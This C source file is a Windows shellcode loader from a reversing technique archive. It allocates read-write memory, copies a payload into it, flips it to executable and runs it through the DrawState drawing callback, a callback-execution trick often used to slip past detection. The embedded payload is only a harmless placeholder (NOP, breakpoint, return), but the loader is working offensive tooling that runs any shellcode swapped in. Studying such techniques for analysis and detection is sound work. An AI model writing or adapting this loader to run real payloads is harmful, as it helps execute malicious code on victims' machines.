/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  DrawState
*/

#include <windows.h>
#include <stdint.h>

#pragma comment(lib,"gdi32")
#pragma comment(lib,"user32")


int WinMain (HINSTANCE inst, HINSTANCE previnst, LPSTR cmdline, int cmdshow)
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    HDC         dc;
    HBITMAP     bmp;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        // create memory DC, which is attached to our thread
        dc  = CreateCompatibleDC(NULL);
        bmp = CreateCompatibleBitmap(dc, 400, 300);
        SelectObject(dc, bmp);

        // trigger by drawing the bitmap
        DrawState (dc, WHITE_BRUSH, (DRAWSTATEPROC)runtime, 0, 0, 0, 0, 100, 100, DST_COMPLEX);

        DeleteDC(dc);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}